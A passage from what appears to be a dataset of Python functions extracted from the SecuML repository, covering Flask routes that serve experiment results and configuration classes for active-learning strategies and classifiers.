    query = session.query(FeaturesAlchemy)
    query = query.filter(FeaturesAlchemy.set_id == features_set_id)
    return jsonify({res.id: {'type': res.type, 'user_id': res.user_id, 'name': res.name, 'description': res.description} for res in query.all()})"
ANSSI-FR/SecuML,getSortingCriteria,"@app.route('/getSortingCriteria/<exp_id>/')
def getSortingCriteria(exp_id):
    exp = update_curr_exp(exp_id)
    scoring_filename = path.join(exp.output_dir(), 'scores.csv')
    scores = pd.read_csv(scoring_filename, header=0, index_col=0)
    criteria = scores.columns.values.tolist()
    criteria = list(set([c.split('_pvalues')[0] for c in criteria]))
    criteria.extend(['alphabet', 'null_variance'])
    criteria.sort()
    return jsonify({'criteria': criteria})"
ANSSI-FR/SecuML,get_feature_user_ids,"def get_feature_user_ids(session, features):
    user_ids = [None for _ in range(len(features))]
    for (i, feature_id) in enumerate(features):
        query = session.query(FeaturesAlchemy)
        query = query.filter(FeaturesAlchemy.id == feature_id)
        user_ids[i] = query.one().user_id
    return user_ids"
ANSSI-FR/SecuML,getSortedFeatures,"@app.route('/getSortedFeatures/<exp_id>/<criterion>/')
def getSortedFeatures(exp_id, criterion):
    exp = update_curr_exp(exp_id)
    scoring_filename = path.join(exp.output_dir(), 'scores.csv')
    scores = pd.read_csv(scoring_filename, header=0, index_col=0)
    pvalues = None
    if criterion == 'alphabet':
        features = scores.index.values.tolist()
        features.sort()
        values = None
        user_ids = get_feature_user_ids(session, features)
        return jsonify({'features': features, 'values': None, 'pvalues': None, 'user_ids': user_ids})
    if criterion == 'null_variance':
        selection = scores.loc[:, 'variance'] == 0
        scores = scores.loc[selection, :]
        criterion = 'variance'
    else:
        sort_data_frame(scores, criterion, False, True)
    features = scores.index.values.tolist()
    values = scores[criterion].tolist()
    values = ['%.2f' % v for v in values]
    pvalues_col = '_'.join([criterion, 'pvalues'])
    if pvalues_col in scores.columns:
        pvalues = scores[pvalues_col].tolist()
        pvalues = ['%.2E' % Decimal(v) for v in pvalues]
    user_ids = get_feature_user_ids(session, features)
    return jsonify({'features': features, 'values': values, 'pvalues': pvalues, 'user_ids': user_ids})"
ANSSI-FR/SecuML,getFeatureScores,"@app.route('/getFeatureScores/<exp_id>/<feature>/')
def getFeatureScores(exp_id, feature):
    exp = update_curr_exp(exp_id)
    return send_file(path.join(exp.output_dir(), feature, 'scores.json'))"
ANSSI-FR/SecuML,getStatsPlot,"@app.route('/getStatsPlot/<exp_id>/<plot_type>/<feature>/')
def getStatsPlot(exp_id, plot_type, feature):
    exp = update_curr_exp(exp_id)
    if plot_type.find('histogram') >= 0:
        filename = plot_type + '.json'
    else:
        filename = plot_type + '.png'
    return send_file(path.join(exp.output_dir(), feature, filename))"
ANSSI-FR/SecuML,getCriterionDensity,"@app.route('/getCriterionDensity/<exp_id>/<criterion>/')
def getCriterionDensity(exp_id, criterion):
    exp = update_curr_exp(exp_id)
    return send_file(path.join(exp.output_dir(), '%s_density.png' % criterion))"
ANSSI-FR/SecuML,get_user_instance_ids,"def get_user_instance_ids(instance_ids):
    query = session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.id.in_(instance_ids))
    query = query.order_by(InstancesAlchemy.id)
    return [r.user_instance_id for r in query.all()]"
ANSSI-FR/SecuML,getNumComponents,"@app.route('/getNumComponents/<exp_id>/')
def getNumComponents(exp_id):
    experiment = update_curr_exp(exp_id)
    directory = experiment.output_dir()
    filename = 'projection_matrix.csv'
    with open(path.join(directory, filename), 'r') as f:
        header = f.readline()
        num_components = len(header.split(',')) - 1
    return str(num_components)"
ANSSI-FR/SecuML,getHexBin,"@app.route('/getHexBin/<exp_id>/<x>/<y>/')
def getHexBin(exp_id, x, y):
    experiment = update_curr_exp(exp_id)
    directory = experiment.output_dir()
    filename = '_'.join(['c', x, y, 'hexbin.json'])
    with open(path.join(directory, filename), 'r') as f:
        hex_bins = json.load(f)
        for hex_bin in hex_bins[1:]:
            if hex_bin['num_malicious_instances'] > NUM_MAX_INSTANCES:
                hex_bin['malicious_instances'] = random.sample(hex_bin['malicious_instances'], NUM_MAX_INSTANCES)
            if hex_bin['num_ok_instances'] > NUM_MAX_INSTANCES:
                hex_bin['ok_instances'] = random.sample(hex_bin['ok_instances'], NUM_MAX_INSTANCES)
            for kind in ['malicious', 'ok']:
                ids = hex_bin['%s_instances' % kind]
                ids.sort()
                hex_bin['%s_user_ids' % kind] = get_user_instance_ids(ids)
                hex_bin['%s_instances' % kind] = ids
    return jsonify(hex_bins)"
ANSSI-FR/SecuML,getProjectionMatrix,"@app.route('/getProjectionMatrix/<exp_id>/')
def getProjectionMatrix(exp_id):
    experiment = update_curr_exp(exp_id)
    directory = experiment.output_dir()
    filename = 'projection_matrix.csv'
    return send_file(path.join(directory, filename))"
ANSSI-FR/SecuML,getExplVar,"@app.route('/getExplVar/<exp_id>/')
def getExplVar(exp_id):
    experiment = update_curr_exp(exp_id)
    directory = experiment.output_dir()
    filename = 'explained_variance.csv'
    return send_file(path.join(directory, filename))"
ANSSI-FR/SecuML,getCumExplVar,"@app.route('/getCumExplVar/<exp_id>/')
def getCumExplVar(exp_id):
    experiment = update_curr_exp(exp_id)
    directory = experiment.output_dir()
    filename = 'cumuled_explained_variance.csv'
    return send_file(path.join(directory, filename))"
ANSSI-FR/SecuML,getReconsErrors,"@app.route('/getReconsErrors/<exp_id>/')
def getReconsErrors(exp_id):
    experiment = update_curr_exp(exp_id)
    directory = experiment.output_dir()
    filename = 'reconstruction_errors.csv'
    return send_file(path.join(directory, filename))"
ANSSI-FR/SecuML,get_instance,"def get_instance(experiment, view_id, user_instance_id, ident):
    dataset = experiment.exp_conf.dataset_conf.dataset
    directory = path.join(secuml_conf.input_data_dir, 'SpamHam', dataset, 'raw_mail')
    with open(path.join(directory, ident), 'r') as f:
        mail = f.read()
        return mail"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global active_learning_conf_factory
    if active_learning_conf_factory is None:
        active_learning_conf_factory = ActiveLearningConfFactory()
    return active_learning_conf_factory"
ANSSI-FR/SecuML,from_args,"def from_args(self, method, args, logger):
    validation_conf = None
    if args.validation_datasets is not None:
        validation_conf = ValidationDatasetsConf.from_args(args, logger)
    class_ = self.get_class(method)
    main_model_type = class_.main_model_type()
    main_model_conf = None
    if main_model_type is not None:
        factory = classifiers.get_factory()
        args.multiclass = main_model_type == 'multiclass'
        classifier_conf = factory.from_args(args.model_class, args, logger)
        test_conf = UnlabeledLabeledConf(logger)
        main_model_conf = ClassificationConf(classifier_conf, test_conf, logger, validation_conf=validation_conf)
    return class_.from_args(args, main_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"def from_json(self, obj, logger):
    class_name = obj['__type__']
    main_model = ClassificationConf.from_json(obj['main_model_conf'], logger)
    validation_conf = None
    if obj['validation_conf'] is None:
        return None
    validation_conf = ValidationDatasetsConf.from_json(obj['validation_conf'], logger)
    return self.methods[class_name].from_json(obj, main_model, validation_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, main_model_conf, validation_conf, logger):
    Conf.__init__(self, logger)
    self.auto = auto
    self.budget = budget
    self.main_model_conf = main_model_conf
    self.validation_conf = validation_conf
    self._set_strategy()"
ANSSI-FR/SecuML,get_strategy,"def get_strategy(self, iteration):
    return self.strategy(iteration)"
ANSSI-FR/SecuML,_set_strategy,"def _set_strategy(self):
    self.strategy = self._get_strategy()
    self.strategy_name = self.strategy.__name__"
ANSSI-FR/SecuML,_get_strategy,"@abc.abstractmethod
def _get_strategy(self):
    return"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return self.strategy_name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('strategy_name', exportFieldMethod.primitive), ('auto', exportFieldMethod.primitive), ('budget', exportFieldMethod.primitive), ('main_model_conf', exportFieldMethod.obj), ('validation_conf', exportFieldMethod.obj)]"
ANSSI-FR/SecuML,gen_main_model_parser,"@staticmethod
def gen_main_model_parser(parser):
    group = parser.add_argument_group('Classification model parameters')
    factory = classifiers.get_factory()
    models = factory.get_methods(ClassifierType.supervised)
    models.extend(factory.get_methods(ClassifierType.semisupervised))
    group.add_argument('--model-class', choices=models, default='LogisticRegression', help='Model class trained at each iteration. Default: LogisticRegression.')
    HyperparamConf.gen_parser(group, None, True, subgroup=False)"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, main_model=True):
    al_group = parser.add_argument_group('Active learning parameters')
    al_group.add_argument('--auto', dest='auto', action='store_true', default=False, help='When specified, the annotation queries are answered automatically by an oracle with the ground-truth labels stored in idents.csv. \nOtherwise, the user must answer some annotation queries in the web interface at each iteration.')
    al_group.add_argument('--budget', type=int, default=2000, help='Total number of annotations asked from the user during the labeling procedure.')
    if main_model:
        ActiveLearningConf.gen_main_model_parser(parser)
    validation_group = parser.add_argument_group('Validation parameters')
    ValidationDatasetsConf.gen_parser(validation_group)
    return al_group"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, num_annotations, validation_conf, logger):
    binary_model = self._get_lr_conf(validation_conf, logger)
    ActiveLearningConf.__init__(self, auto, budget, binary_model, validation_conf, logger)
    self.multiclass_model = self._get_lr_conf(None, logger, multiclass=True)
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,_get_lr_conf,"def _get_lr_conf(self, validation_conf, logger, multiclass=False):
    factory = classifiers.get_factory()
    classifier_conf = factory.get_default('LogisticRegression', None, None, multiclass, logger)
    return ClassificationConf(classifier_conf, UnlabeledLabeledConf(logger), logger, validation_conf=validation_conf)"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return None"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return Aladin"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return '%s__batch_%d' % (ActiveLearningConf.get_exp_name(self), self.num_annotations)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('multiclass_model', exportFieldMethod.obj), ('num_annotations', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser)
    al_group.add_argument('--num-annotations', type=int, default=100, help='Number of annotations asked from the user at each iteration.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, binary_model_conf, validation_conf, logger):
    return AladinConf(args.auto, args.budget, args.num_annotations, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, binary_model_conf, validation_conf, logger):
    return AladinConf(obj['auto'], obj['budget'], obj['num_annotations'], validation_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, batch, b, binary_model_conf, validation_conf, logger):
    ActiveLearningConf.__init__(self, auto, budget, binary_model_conf, validation_conf, logger)
    self.b = b
    self.batch = batch"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return 'binary'"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return CesaBianchi"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = ActiveLearningConf.get_exp_name(self)
    name += '__b_%.2f' % self.b
    name += '__batch_%d' % self.batch
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('b', exportFieldMethod.primitive), ('batch', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser, main_model=True)
    al_group.add_argument('--batch', type=int, default=100, help='Number of annotations asked from the user at each iteration.')
    al_group.add_argument('--b', type=float, default=0.1)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, binary_model_conf, validation_conf, logger):
    return CesaBianchiConf(args.auto, args.budget, args.batch, args.b, binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, binary_conf, validation_conf, logger):
    return CesaBianchiConf(obj['auto'], obj['budget'], obj['batch'], obj['b'], binary_conf, validation_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, batch, validation_conf, logger):
    binary_model_conf = self._get_main_model_conf(validation_conf, logger)
    ActiveLearningConf.__init__(self, auto, budget, binary_model_conf, validation_conf, logger)
    self.batch = batch"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return None"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return Gornitz"
ANSSI-FR/SecuML,_get_main_model_conf,"def _get_main_model_conf(self, validation_conf, logger):
    hyperparam_conf = HyperparamConf.get_default(None, None, False, None, logger)
    classifier_conf = SssvddConf(hyperparam_conf, logger)
    return ClassificationConf(classifier_conf, UnlabeledLabeledConf(logger), logger, validation_conf=validation_conf)"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = ActiveLearningConf.get_exp_name(self)
    name += '__batch_%d' % self.batch
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('batch', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser)
    al_group.add_argument('--batch', type=int, default=100, help='Number of annotations asked from the user at each iteration.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, binary_model_conf, validation_conf, logger):
    return GornitzConf(args.auto, args.budget, args.batch, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, binary_model_conf, validation_conf, logger):
    return GornitzConf(obj['auto'], obj['budget'], obj['batch'], validation_conf, logger)"
ANSSI-FR/SecuML,_rcd_conf,"def _rcd_conf(args, logger):
    factory = classifiers.get_factory()
    classifier_conf = factory.get_default('LogisticRegression', None, None, True, logger)
    classif_conf = ClassificationConf(classifier_conf, UnlabeledLabeledConf(logger), logger)
    return RcdStrategyConf(classif_conf, args.cluster_strategy, args.num_annotations, 'uniform', logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, rcd_conf, num_uncertain, binary_model_conf, validation_conf, logger):
    ActiveLearningConf.__init__(self, auto, budget, binary_model_conf, validation_conf, logger)
    self.num_uncertain = num_uncertain
    self.rcd_conf = rcd_conf"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return 'binary'"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return Ilab"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = ActiveLearningConf.get_exp_name(self)
    name += '__RCD_%s' % self.rcd_conf.get_exp_name()
    name += '__numUnsure_%d' % self.num_uncertain
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('num_uncertain', exportFieldMethod.primitive), ('rcd_conf', exportFieldMethod.obj)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser, main_model=True)
    al_group.add_argument('--num-uncertain', type=int, default=10, help='Number of instances queried close to the decision boundary.')
    al_group.add_argument('--num-annotations', type=int, default=45, help='Number of instances queried for each family.')
    al_group.add_argument('--cluster-strategy', default='center_anomalous')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, binary_model_conf, validation_conf, logger):
    rcd_conf = _rcd_conf(args, logger)
    return IlabConf(args.auto, args.budget, rcd_conf, args.num_uncertain, binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, binary_model_conf, validation_conf, logger):
    rcd_conf = RcdStrategyConf.from_json(obj['rcd_conf'], logger)
    return IlabConf(obj['auto'], obj['budget'], rcd_conf, obj['num_uncertain'], binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, batch, binary_model_conf, validation_conf, logger):
    ActiveLearningConf.__init__(self, auto, budget, binary_model_conf, validation_conf, logger)
    self.batch = batch"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return 'binary'"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return Random"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = ActiveLearningConf.get_exp_name(self)
    name += '__batch_%d' % self.batch
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('batch', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser, main_model=True)
    al_group.add_argument('--batch', type=int, default=100, help='Number of annotations asked from the user at each iteration.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, binary_model_conf, validation_conf, logger):
    return RandomConf(args.auto, args.budget, args.batch, binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, binary_model_conf, validation_conf, logger):
    return RandomConf(obj['auto'], obj['budget'], obj['batch'], binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, rcd_conf, multiclass_model_conf, validation_conf, logger):
    ActiveLearningConf.__init__(self, auto, budget, multiclass_model_conf, validation_conf, logger)
    self.rcd_conf = rcd_conf"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return 'multiclass'"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return Rcd"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return '%s__RCD_%s' % (ActiveLearningConf.get_exp_name(self), self.rcd_conf.get_exp_name())"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('rcd_conf', exportFieldMethod.obj)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser, main_model=True)
    al_group.add_argument('--num-annotations', type=int, default=100, help='Number of instances queried for each family.')
    al_group.add_argument('--cluster-strategy', default='center_anomalous')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, main_model_conf, validation_conf, logger):
    strategy = RcdStrategyConf(main_model_conf, args.cluster_strategy, args.num_annotations, 'uniform', logger)
    return RcdConf(args.auto, args.budget, strategy, main_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, main_model_conf, validation_conf, logger):
    rcd_conf = RcdStrategyConf.from_json(obj['rcd_conf'], logger)
    return RcdConf(obj['auto'], obj['budget'], rcd_conf, main_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, classification_conf, cluster_strategy, num_annotations, cluster_weights, logger):
    Conf.__init__(self, logger)
    self.classification_conf = classification_conf
    self.cluster_strategy = cluster_strategy
    self.num_annotations = num_annotations
    self.cluster_weights = cluster_weights"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return '%s__num_annotations_%d' % (self.classification_conf.get_exp_name(), self.num_annotations)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('classification_conf', exportFieldMethod.obj), ('cluster_strategy', exportFieldMethod.primitive), ('num_annotations', exportFieldMethod.primitive), ('cluster_weights', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    classif_conf = ClassificationConf.from_json(obj['classification_conf'], logger)
    return RcdStrategyConf(classif_conf, obj['cluster_strategy'], obj['num_annotations'], obj['cluster_weights'], logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, batch, binary_model_conf, validation_conf, logger):
    ActiveLearningConf.__init__(self, auto, budget, binary_model_conf, validation_conf, logger)
    self.batch = batch"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return 'binary'"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return TopN"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = ActiveLearningConf.get_exp_name(self)
    name += '__batch_%d' % self.batch
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('batch', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser, main_model=True)
    al_group.add_argument('--batch', type=int, default=100, help='Number of annotations asked from the user at each iteration.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, binary_model_conf, validation_conf, logger):
    return TopNConf(args.auto, args.budget, args.batch, binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, binary_model_conf, validation_conf, logger):
    return TopNConf(obj['auto'], obj['budget'], obj['batch'], binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, auto, budget, batch, binary_model_conf, validation_conf, logger):
    ActiveLearningConf.__init__(self, auto, budget, binary_model_conf, validation_conf, logger)
    self.batch = batch"
ANSSI-FR/SecuML,main_model_type,"@staticmethod
def main_model_type():
    return 'binary'"
ANSSI-FR/SecuML,_get_strategy,"def _get_strategy(self):
    return Uncertainty"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = ActiveLearningConf.get_exp_name(self)
    name += '__batch_%d' % self.batch
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ActiveLearningConf.fields_to_export(self)
    fields.extend([('batch', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    al_group = ActiveLearningConf.gen_parser(parser, main_model=True)
    al_group.add_argument('--batch', type=int, default=100, help='Number of annotations asked from the user at each iteration.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, binary_model_conf, validation_conf, logger):
    return UncertaintyConf(args.auto, args.budget, args.batch, binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, binary_model_conf, validation_conf, logger):
    return UncertaintyConf(obj['auto'], obj['budget'], obj['batch'], binary_model_conf, validation_conf, logger)"
ANSSI-FR/SecuML,get_factory,"def get_factory():
    global classifier_conf_factory
    if classifier_conf_factory is None:
        classifier_conf_factory = ClassifierConfFactory()
    return classifier_conf_factory"
ANSSI-FR/SecuML,get_classifier_type,"def get_classifier_type(class_):
    if issubclass(class_, UnsupervisedClassifierConf):
        return ClassifierType.unsupervised
    elif issubclass(class_, SemiSupervisedClassifierConf):
        return ClassifierType.semisupervised
    elif issubclass(class_, SupervisedClassifierConf):
        return ClassifierType.supervised
    elif issubclass(class_, ClassifierConf):
        return None
    raise ValueError('%s is not a classifier configuration.' % class_.__name__)"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Supervised learning models require that the training dataset contains at least two classes.'"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Supervised learning models require that all the training instances are annotated. '"
ANSSI-FR/SecuML,from_args,"def from_args(self, method, args, logger):
    class_ = self.methods[method + 'Conf']
    hyper_conf = None
    if method != 'AlreadyTrained':
        is_supervised = get_classifier_type(class_) == ClassifierType.supervised
        hyper_conf = HyperparamConf.from_args(args, class_, is_supervised, logger)
    return class_.from_args(args, hyper_conf, logger)"
ANSSI-FR/SecuML,from_json,"def from_json(self, obj, logger):
    class_ = self.methods[obj['__type__']]
    hyper_conf = HyperparamConf.from_json(obj['hyperparam_conf'], class_, logger)
    return class_.from_json(obj['multiclass'], hyper_conf, obj, logger)"
ANSSI-FR/SecuML,get_methods,"def get_methods(self, classifier_type=None):
    all_classifiers = ConfFactory.get_methods(self)
    if classifier_type is None:
        return all_classifiers
    else:
        return [c for c in all_classifiers if get_classifier_type(self.get_class(c)) == classifier_type]"
ANSSI-FR/SecuML,get_default,"@staticmethod
def get_default(model_class, num_folds, n_jobs, multiclass, logger):
    class_ = get_factory().get_class(model_class)
    hyper_conf = HyperparamConf.get_default(num_folds, n_jobs, multiclass, class_, logger)
    return class_(multiclass, hyper_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyperparam_conf, logger):
    Conf.__init__(self, logger)
    self.multiclass = multiclass
    self.model_class = None
    self.hyperparam_conf = hyperparam_conf
    self.accept_sparse = False
    self._set_characteristics()"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = self.model_class_name
    if self.multiclass:
        name += '__Multiclass'
    return name"
ANSSI-FR/SecuML,_set_characteristics,"def _set_characteristics(self):
    self.probabilist = self.is_probabilist()
    self.feature_importance = self.get_feature_importance()
    self._set_model_class()"
ANSSI-FR/SecuML,_get_model_class,"@abc.abstractmethod
def _get_model_class(self):
    return"
ANSSI-FR/SecuML,_check_hyper_args,"@staticmethod
def _check_hyper_args(args):
    return None"
ANSSI-FR/SecuML,_set_model_class,"def _set_model_class(self):
    self.model_class = self._get_model_class()
    self.model_class_name = self.model_class.__name__"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('hyperparam_conf', exportFieldMethod.obj), ('multiclass', exportFieldMethod.primitive), ('probabilist', exportFieldMethod.primitive), ('feature_importance', exportFieldMethod.primitive), ('model_class_name', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,is_probabilist,"@abc.abstractmethod
def is_probabilist(self):
    return"
ANSSI-FR/SecuML,scoring_function,"@abc.abstractmethod
def scoring_function(self):
    return"
ANSSI-FR/SecuML,get_feature_importance,"@abc.abstractmethod
def get_feature_importance(self):
    return"
ANSSI-FR/SecuML,is_interpretable,"def is_interpretable(self):
    return self.get_feature_importance() in ['score', 'weight']"
ANSSI-FR/SecuML,interpretable_predictions,"def interpretable_predictions(self):
    return self.get_feature_importance() == 'weight'"
ANSSI-FR/SecuML,get_coefs,"def get_coefs(self, model):
    feature_importance = self.get_feature_importance()
    if feature_importance == 'weight':
        if self.multiclass:
            return model.coef_
        else:
            return model.coef_[0]
    elif feature_importance == 'score':
        return model.feature_importances_
    else:
        return None"
ANSSI-FR/SecuML,get_supervision,"def get_supervision(self, instances, ground_truth=False, check=True):
    annotations = instances.get_annotations(ground_truth)
    return annotations.get_supervision(self.multiclass)"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyperparam_conf, logger):
    ClassifierConf.__init__(self, multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, model_class):
    parser.add_argument('--multiclass', default=False, action='store_true', help='The classifier is trained on the families instead of the binary labels.')
    HyperparamConf.gen_parser(parser, model_class, True)"
ANSSI-FR/SecuML,get_supervision,"def get_supervision(self, instances, ground_truth=False, check=True):
    supervision = ClassifierConf.get_supervision(self, instances, ground_truth=ground_truth, check=check)
    if not np.all(supervision != None):
        raise MissingAnnotations()
    if check:
        if len(set(supervision)) < 2:
            raise AtLeastTwoClasses()
    if self.multiclass:
        return supervision.astype('str')
    else:
        return supervision.astype('int')"
ANSSI-FR/SecuML,__init__,"def __init__(self, hyperparam_conf, logger):
    ClassifierConf.__init__(self, False, hyperparam_conf, logger)"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return None"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, model_class):
    HyperparamConf.gen_parser(parser, model_class, False)"
ANSSI-FR/SecuML,supervision,"def supervision(self, instances, ground_truth=False, check=True):
    if not ground_truth:
        return None
    return ClassifierConf.get_supervision(self, instances, ground_truth=ground_truth, check=check).astype('int')"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyperparam_conf, logger):
    ClassifierConf.__init__(self, multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, model_class, multiclass=True):
    if multiclass:
        parser.add_argument('--multiclass', default=False, action='store_true', help='The classifier is trained on the families instead of the binary labels.')
    HyperparamConf.gen_parser(parser, model_class, False)"
ANSSI-FR/SecuML,get_supervision,"def get_supervision(self, instances, ground_truth=False, check=True):
    supervision = ClassifierConf.get_supervision(self, instances, ground_truth=ground_truth, check=check)
    supervision = deepcopy(supervision)
    mask_unnanotated = supervision == None
    supervision[mask_unnanotated] = -1
    return supervision.astype('int')"
ANSSI-FR/SecuML,__init__,"def __init__(self, model_exp_id, logger):
    ClassifierConf.__init__(self, None, None, logger)
    self.model_exp_id = model_exp_id
    self.accept_sparse = True"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return None"
ANSSI-FR/SecuML,_set_model_class,"def _set_model_class(self):
    self.model_class = None
    self.model_class_name = 'AlreadyTrained'"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return 'AlreadyTrained_exp%i' % self.model_exp_id"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return AlreadyTrainedConf(obj['model_exp_id'], logger)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ClassifierConf.fields_to_export(self)
    fields.extend([('model_exp_id', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return None"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return None"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    return None"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('--model-exp-id', required=True, type=int, help='Id of the experiment that has trained the model.')"
